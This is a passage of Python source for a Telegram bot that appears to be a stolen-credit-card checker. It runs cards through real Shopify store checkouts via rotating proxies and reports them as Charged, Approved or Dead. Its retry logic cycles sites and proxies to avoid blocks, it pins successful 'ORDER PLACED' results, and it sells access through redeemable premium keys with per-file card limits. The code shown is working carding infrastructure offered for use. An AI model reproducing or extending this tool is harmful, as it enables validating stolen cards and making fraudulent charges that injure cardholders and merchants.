        await event.reply(pe("No proxy set. Use <code>/setproxy ip:port</code>"), parse_mode='html'); return

    smsg = await event.reply(pe(
        f"Checking...\n"
        f"<b>{SEP}</b>\n"
        f"Card: <code>{card}</code>"
    ), parse_mode='html')

    try:
        result, bin_info, (cname, cusername) = await asyncio.gather(
            asyncio.to_thread(check_card_with_retry_sync, card, sites, proxies, 1, 2),
            get_bin_info(card.split('|')[0]),
            get_display_info(uid),
        )
        resp = build_result_card(result, bin_info, uid, cname)
        await smsg.edit(resp, parse_mode='html')
        record_check(uid, cname, result.get('status', 'Dead'), username=cusername)
        record_log(uid, cname, cusername,
                   result.get('card', card),
                   result.get('status', 'Dead'),
                   result.get('message', ''),
                   result.get('site', ''),
                   result.get('gateway', 'Shopify Payments'),
                   result.get('price', '-'))
        if result.get('status') == 'Charged':
            try:
                await bot.pin_message(uid, smsg.id, notify=True)
            except Exception:
                pass
    except Exception as e:
        await smsg.edit(pe(f"Error: {e}"), parse_mode='html')


def check_card_with_retry_sync(card, sites, proxies, max_retries=2, max_proxy_tries=None):
    """Sync retry wrapper around run_checkout_for_card."""
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')

    last_err  = 'Unknown error'
    pool      = list(proxies) if proxies else []
    MAX_TRIES = max(max_proxy_tries or 0, max_retries, 3)
    failed_sites: set = set()

    for attempt in range(MAX_TRIES):
        available = [s for s in sites if s not in failed_sites] or list(sites)
        if not available:
            failed_sites.clear()
            available = list(sites)
        shop_url = random.choice(available)

        if pool:
            proxy_raw = random.choice(pool)
            try:
                proxy_url = normalize_proxy(proxy_raw)
            except Exception:
                proxy_url = ""
        else:
            proxy_raw = ""
            proxy_url = ""

        try:
            res = run_checkout_for_card(shop_url, card, proxy_url)
        except Exception as e:
            last_err = str(e)
            failed_sites.add(shop_url)
            if attempt < MAX_TRIES - 1:
                continue
            return _make_result(card, 'Dead', last_err)

        msg = str(res.status_code or res.error or "Error")

        if res.status == CheckStatus.CHARGED:
            return _make_result(card, 'Charged', 'ORDER PLACED',
                                price=res.amount or '-',
                                receipt_url=res.receipt_url or '',
                                proxy=proxy_raw, site=shop_url)

        if res.status == CheckStatus.APPROVED:
            return _make_result(card, 'Approved', msg,
                                price=res.amount or '-',
                                proxy=proxy_raw, site=shop_url)

        if res.status == CheckStatus.DECLINED:
            return _make_result(card, 'Dead', msg,
                                retryable=False, site=shop_url)

        # ERROR — decide retry
        last_err = msg
        ml = last_err.lower()
        if res.retryable and attempt < MAX_TRIES - 1:
            failed_sites.add(shop_url)
            continue
        return _make_result(card, 'Dead', last_err, retryable=res.retryable, site=shop_url)

    return _make_result(card, 'Dead', last_err)


def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', site=''):
    return {
        'status':      status,
        'message':     message,
        'card':        card,
        'gateway':     gateway,
        'price':       price,
        'receipt_url': receipt_url,
        'retry':       retryable,
        'proxy':       proxy,
        'site':        site,
    }


# ─── SETPROXY ─────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/setproxy(\s+.+)?$'))
async def setproxy_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("Access Denied."), parse_mode='html'); return
    args = event.message.text.split(None, 1)
    if len(args) < 2 or not args[1].strip():
        curr = get_user_proxy(uid) or "Not set"
        await event.reply(pe(
            f"Your Proxy\n"
            f"Current: <code>{curr}</code>\n\n"
            f"Set with:\n<code>/setproxy ip:port</code>\n"
            f"<code>/setproxy ip:port:user:pass</code>"
        ), parse_mode='html'); return
    proxy = args[1].strip()
    set_user_proxy(uid, proxy)
    await event.reply(pe(f"Proxy set!\n<code>{proxy}</code>"), parse_mode='html')


# ─── REDEEM ───────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/redeem(\s+.*)?$'))
async def redeem_command(event):
    uid   = event.sender_id
    parts = event.message.text.split(None, 1)
    if len(parts) < 2 or not parts[1].strip():
        await event.reply(pe(f"Usage: <code>/redeem {KEY_PREFIX}-XXXX</code>"), parse_mode='html'); return
    key = parts[1].strip()
    if key not in _keys_data:
        await event.reply(pe("Invalid key."), parse_mode='html'); return
    kdata = _keys_data[key]
    if kdata.get('redeemed_by') is not None:
        await event.reply(pe("Key already redeemed."), parse_mode='html'); return
    plan_days = kdata['plan_days']
    set_user_access(uid, "key", plan_days, granted_by="key")
    _keys_data[key]['redeemed_by'] = uid
    _keys_data[key]['redeemed_at'] = _now_utc().isoformat()
    save_keys()
    trem = time_remaining(uid)
    await event.reply(pe(
        f"Key Redeemed!\n"
        f"Plan: {plan_days} day(s)\n"
        f"Expires in: {trem}\n"
        f"Limit: {get_user_limit(uid)} cards/file"
    ), parse_mode='html')


# ─── MYPLAN ───────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/myplan$'))
async def myplan_command(event):
    uid  = event.sender_id
    tier = get_user_tier(uid)
    trem = time_remaining(uid)
    lim  = get_user_limit(uid)
    if is_admin(uid):
        await event.reply(pe(f"Admin - unlimited access"), parse_mode='html'); return
    if not tier:
        await event.reply(pe(f"No active plan. Redeem: <code>/redeem {KEY_PREFIX}-XXXX</code>"), parse_mode='html'); return
    acc = _user_access.get(uid, {})
    exp = acc.get('expires_at', '')[:10]
    await event.reply(pe(
        f"My Plan\n"
        f"Tier: {tier.capitalize()}\n"
        f"Expires: {exp}\n"
        f"Remaining: {trem or 'Expired'}\n"
        f"Limit: {lim} cards/file"
    ), parse_mode='html')


# ─── CLEARUSERPROXY ───────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/clearuserproxy$'))
async def clearuserproxy_command(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("Access Denied."), parse_mode='html'); return
    count = len(get_user_proxy_list(uid))
    clear_user_proxies(uid)
    await event.reply(pe(f"Cleared {count} proxies."), parse_mode='html')


# ─── MCANCEL ──────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/mcancel$'))
async def mcancel_command(event):
    uid = event.sender_id
    canceled = False
    for k in list(active_sessions):
        if k.startswith(f"{uid}_"):
            del active_sessions[k]
            canceled = True
    await event.reply(pe("Mass check cancelled." if canceled else "No active mass check."), parse_mode='html')


# ─── PROXY TEST ───────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe("Access Denied."), parse_mode='html'); return
    proxy = event.message.text.split(' ', 1)[1].strip()
    smsg  = await event.reply(pe(f"Testing <code>{proxy}</code>..."), parse_mode='html')
    try:
        p_url = normalize_proxy(proxy)
    except Exception as e:
        await smsg.edit(pe(f"Invalid proxy: {e}"), parse_mode='html'); return
    ok = await asyncio.to_thread(test_proxy, p_url)
    if ok:
        await smsg.edit(pe(f"Proxy ALIVE\n<code>{proxy}</code>"), parse_mode='html')
    else:
        await smsg.edit(pe(f"Proxy DEAD\n<code>{proxy}</code>"), parse_mode='html')


# ─── ADMIN ────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/admin$'))
async def admin_panel_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe("Admin only."), parse_mode='html'); return
    pcount = len(load_premium_users()) + len(_user_access)
    scount = len(load_sites())
    pxpool = len(load_proxies())
    kcount = len(_keys_data)
    unused = sum(1 for v in _keys_data.values() if v.get('redeemed_by') is None)
    text = pe(
        f"Admin Panel - {BOT_BRAND}\n"
        f"<b>{SEP}</b>\n"
        f"Users: {pcount}\n"
        f"Sites: {scount}\n"
        f"Proxy Pool: {pxpool}\n"
        f"Keys: {kcount} total | {unused} unused\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await raw_send(event.sender_id, text, [])


# ─── STARTUP ──────────────────────────────────────────────────────
def main():
    if not BOT_TOKEN or not API_ID or not API_HASH:
        print("[FATAL] Missing API_ID / API_HASH / BOT_TOKEN in .env")
        sys.exit(1)
    print(f"[{BOT_BRAND}] Starting... admin ids: {sorted(ADMIN_IDS)}")
    print(f"[{BOT_BRAND}] Sites: {len(load_sites())} | Proxies: {len(load_proxies())}")
    bot.start(bot_token=BOT_TOKEN)
    print(f"[{BOT_BRAND}] Ready.")
    bot.run_until_disconnected()


if __name__ == "__main__":
    main()